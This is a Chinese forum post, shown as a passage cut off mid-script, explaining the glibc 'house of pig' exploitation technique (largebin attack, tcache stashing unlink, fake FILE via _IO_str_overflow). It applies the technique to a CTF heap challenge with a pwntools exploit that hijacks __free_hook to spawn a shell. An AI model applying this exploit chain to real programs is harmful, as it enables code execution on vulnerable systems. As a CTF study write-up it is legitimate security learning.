---
title: house of pig与house of pig orw
url: https://forum.butian.net/share/3887
source: 奇安信攻防社区
date: 2024-11-20
fetch_date: 2025-10-06T19:14:58.048082
---

# house of pig与house of pig orw

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### house of pig与house of pig orw

本文包含了house of pig这个经典的IO链的原理以及复现过程，以及基于house of pig的orw如何进行

house of pig
============
[原理详解](https://blog.csdn.net/qq\_54218833/article/details/128575508)
[题目详解](https://a1ex.online/2021/06/30/2021-XCTF-final%E9%A2%98%E8%A7%A3/)
\*\*\\_IO\\_str\\_jumps中的\\_IO\\_str\\_overflow\*\*
核心
==
利用\\_IO\\_str\\_overflow的malloc,memcpy,free三连，设置FAKE\\_FILE的值，使得free\\_hook被覆盖为system函数，最后free就可以拿到shell，怎么设置看源代码的函数执行流程
例题
==
\*\*house of pig\*\*
主要是利用了largebin attack,tcache stashing unlink attack，伪造FILE结构等手法
- 题目分析：
1. 这个题是个C++代码，对于笔者分析还是有不小难度，但是对于逆向来说，我们不要在乎那么多细节，抓住核心利用点，这才是关键。
2. 这个题用栈来存储chunk的相关数据，与之前总是用全局变量来存储有所不同，所以一开始看的我很晕，而且ida反汇编C++的东西又不好看，导致很多时间在纠结一些细节，但不要忘记堆就几个关键，\*\*chunklist,sizelist,marklist\*\*，这个题也不例外，抓住这点就够了
3. 这个题\*\*在change role时候把原本的chunk相关数据copy到mmap\\_addr，但是没有copy完全，这就是漏洞利用点\*\*。可以很明显看到edit,show都是只看mark1,不看mark2,但是copy没有拷贝mark1中的数据，那么再次切换回来就会让mark1=0（因为mmap中的数据本身就是0），这就有了uaf
4. peppa(A) 0-19 calloc(0x90-0x430)
mummy(B) 0-9 calloc(0x90-0x450)
daddy(C) 0-4 calloc(0x90-0x440) if(add&amp;&amp;i==4) 再malloc(0xe8)
5. 这个题还有个点要注意，平时read都是可以控制整个mem区域，但这个题又做了一个限制。把控制的mem以每0x30为一块，A只可写每块的0-0x10,B只可写每块的0x10-0x20,C只可写每块的0x20-0x30。\*\*虽然做了限制，但是也给人启发，A相当于控制fd,bk;B相当于控制fd\\_nextsize,bk\\_nextsize\*\*
- 攻击流程
1. 为tcache stashing unlink attack做准备，tcache中5个，smallbin中2个，大小都为0xa0
2. 利用largebin泄露libcbase,heapbase。泄露libcbase就是把largebin chunk free后进入unsorted bin，uaf很容易泄露libcbase。泄露heapbase就是再calloc一个比它还大的chunk让它进入largebin，覆盖它的fd,bk，show就是它的fd\\_nextsize，dbg一看一做差就可以了
3. largebin attack向free\\_hook-0x8处写入一个堆地址，这是为了绕过tcache stashing unlink attack的检查。具体做法是先让一个size大的chunk进入largebin,edit它的bk\\_nextsize为free\\_hook-0x28，再让一个size比它小的chunk先进入unsorted bin再链入largebin即可
4. 再一次largebin attack向\\_IO\\_list\\_all写入一个堆地址，\*\*要记住这个堆地址，因为我们还要将它申请出来伪造FILE结构\*\*，方法同上
5. tcache stashing unlink attack将free\\_hook-0x10链入0xa0的chunk大小的tcache中。让修改smallbin的第一个chunk的bk指针修改为free\\_hook-0x10-0x10，触发tcache stashing unlink attack。注意这里的细节，free\\_hook-0x8（也就是target+0x8）在之前被修改为了一个堆地址，所以可写，不会引发异常
6. 在触发tcache stashing unlink attack时，add的时候i要刚好为4，此时刚好malloc(0xe8)。\*\*在此题中\\_IO\\_list\\_all写入一个堆地址是一个FAKE FILE，但是它的编写受限制，因此将其的\\*chain指向一个堆地址，再malloc(0xe8)刚好将这个堆地址申请出来，这里才是我们存放\\_IO\\_str\\_overflow的vtable的FAKE FILE!!!\*\*
7. 在change\\_role中输入空字符触发len检查调用exit函数，进而执行\\_IO\\_str\\_overflow函数
8. exit函数会执行\\_IO\\_flush\\_all\\_lockp函数来遍历 FILE结构体，而其中就有\\_IO\\_str\\_overflow函数，因此要满足(fp-&gt;\\_mode &lt;= 0 &amp;&amp; fp-&gt;\\_IO\\_write\\_ptr &gt; fp-&gt;\\_IO\\_write\\_base)才能让那个if语句执行到\\_IO\\_str\\_overflow
9. 在\\_IO\\_str\\_overflow函数中malloc,memcpy,free三连（具体细节看源码）old\\_blen = \\_IO\\_blen (fp);new\\_size = 2 \\* old\\_blen + 0x64; malloc (new\\_size);\*\*注意这个malloc正是想要malloc出0xa0 chunk大小的tcache头部存的free\\_hook-0x10\*\*,因此IO\\_buf\\_end，IO\\_buf\\_base，要精心设计。memcpy (new\\_buf, old\\_buf, old\\_blen);free (old\\_buf);\*\*因此IO\\_buf\\_base要刚好是FAKE FILE中/bin/sh\\x00的地址（是个堆地址）\*\*
10. 在写exp的途中要注意修改smallbin的bk指针，largebin中的bk\\_nextsize指针时如果破坏了要注意修复。同时还要注意各个bin当前的状态不要和预期的状态不一样。也要注意算FILE的偏移要不要0x10这个问题
```python
from pwn import \*
from pwnlib.util.packing import p64
from pwnlib.util.packing import u64
context(os='linux', arch='amd64', log\_level='debug')
file = "/home/zp9080/PWN/pig"
elf=ELF(file)
libc =elf.libc
io = process(file)
def dbg():
gdb.attach(io,'b \*$rebase(0xD80)')
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
sn = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
irt = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def dbg():
gdb.attach(io, 'b \*$rebase(0x3761)')
def Menu(cmd):
sla('Choice: ', str(cmd))
def Add(size, content):
Menu(1)
sla('size: ', str(size))
sla('message: ', content)
def Show(idx):
Menu(2)
sla('index: ', str(idx))
def Edit(idx, content):
Menu(3)
sla('index: ', str(idx))
sa('message: ', content)
def Del(idx):
Menu(4)
sla('index: ', str(idx))
def Change(user):
Menu(5)
if user == 1:
sla('user:\n', 'A\x01\x95\xc9\x1c')
elif user == 2:
sla('user:\n', 'B\x01\x87\xc3\x19')
elif user == 3:
sla('user:\n', 'C\x01\xf7\x3c\x32')
#----- prepare tcache\_stashing\_unlink\_attack
#calloc申请5个0xa0堆块，并放入 tcache
Change(2)
for x in range(5):
Add(0x90, 'B'\*0x28) # B0~B4
Del(x) #B0~B4
#role1 calloc(0x150)，用于切割出0xa0的small bin chunk
Change(1)
Add(0x150, 'A'\*0x68) # A0
#填充0x160 tcache，使得 A0进入 unsortedbin
for x in range(7):
Add(0x150, 'A'\*0x68) # A1~A7
Del(1+x)
#A0放入 unsortedbin
Del(0)
#切割 A0，剩余0xa0放入smallbin
Change(2)
Add(0xb0, 'B'\*0x28) # B5 split 0x160 to 0xc0 and 0xa0
#同样道理 利用0x190切割 0xa0放入 smallbin
Change(1)
Add(0x180, 'A'\*0x78) # A8
for x in range(7):
Add(0x180, 'A'\*0x78) # A9~A15
Del(9+x)
Del(8)
Change(2)
Add(0xe0, 'B'\*0x38) # B6 split 0x190 to 0xf0 and 0xa0
#----- leak libc\_base and heap\_base
#role1 calloc(0x430)，用于放入largbin，泄漏地址
Change(1)
Add(0x430, 'A'\*0x158) # A16
#间隔top chunk
Change(2)
Add(0xf0, 'B'\*0x48) # B7
#释放A16进入unsorted bin
Change(1)
Del(16)
#使 A16 进入 largebin
Change(2)
Add(0x440, 'B'\*0x158) # B8
#利用 UAF先泄漏 libc地址
Change(1)
Show(16)
ru('message is: ')
libc\_base = uu64(rl()) - 0x1ebfe0
lg('libc\_base')
#利用UAF泄漏heapbase地址
Edit(16, 'A'\*0xf+'\n')
Show(16)
ru('message is: '+'A'\*0xf+'\n')
heap\_base = uu64(rl()) - 0x13940
lg('heap\_base')
print("---> 1 largbin attack to change \_\_free\_hook-8")
#----- first largebin\_attack
# recover,fd,bk不对的话在largebin中找不到
Edit(16, 2\*p64(libc\_base+0x1ebfe0) + b'\n')
#A17直接largebin中得到(A16)
Add(0x430, 'A'\*0x158) # A17
Add(0x430, 'A'\*0x158) # A18
Add(0x430, 'A'\*0x158) # A19
Change(2)
#释放 0x450堆块 chunk8
Del(8)
#使得 chunk8 进入 largebin
Add(0x450, 'B'\*0x168) # B9
#释放0x440堆块进入 unsortedbin，其size 小于 chunk8
Change(1)
Del(17)
#修改chunk8->bk\_nextsize = free\_hook-0x28
Change(2)
free\_hook = libc\_base + libc.sym['\_\_free\_hook']
Edit(8, p64(0) + p64(free\_hook-0x28) + b'\n')
#触发largebin attack
Change(3)
#注意B8的大小是0x450，这里不能add(0x440)
#只要触发了unsortedbin循环就可以，unsorted bin中的large chunk会先被放入largebin再拿出来切割
Add(0xa0, 'C'\*0x28) # C0 triger largebin\_attack, write a heap addr to \_\_free\_hook-8
#修复chunk8
Change(2)
# recover B8的fd-nextsize,bk-nextsize指向自己
#此时largebin中只有B8，配合下一次largebin attack
Edit(8, 2\*p64(heap\_base+0x13e80) + b'\n')
print("---> 2 largebin attack to change \_IO\_list\_all")
#----- second largebin\_attack
#将unsortedbin 清空
Change(3)
Add(0x380, 'C'\*0x118) # C1
#释放A19 0x440到unsortedbin中
Change(1)
Del(19)
#修改chunk8->bk\_nextsize = io\_list\_all-0x20
Change(2)
IO\_list\_all = libc\_base + libc.sym['\_IO\_list\_all']
Edit(8, p64(0) + p64(IO\_list\_all-0x20) + b'\n')
#触发largebin attack
Change(3)
Add(0xa0, 'C'\*0x28) # C2 triger largebin\_attack, write a heap addr to \_IO\_list\_all
#修复largebin
Change(2)
Edit(8, 2\*p64(heap\_base+0x13e80) + b'\n') # recover
print("==== tcache stashing unlink attack and FILE attack")
#----- tcache\_stashing\_unlink\_attack and FILE attack
#修改smallbin 中的第一个chunk的 bk指针为 free\_hook-0x20,smallbin: chunk8->chunk7
#target-0x10=free\_hook-0x20,target=free\_hook-0x10,free\_hook-0x8可写，因为之前将其写入了一个堆地址
Change(1)
#这个地方要留意，A8为calloc(0x180),又被分割,calloc(0xe0)，而B每次只能写入0x10-0x20的位置
#0x10 0x40 0x70 0xa0 0xd0 0x100 0x190=0x10+0xe0+0xa0，所以这个pa...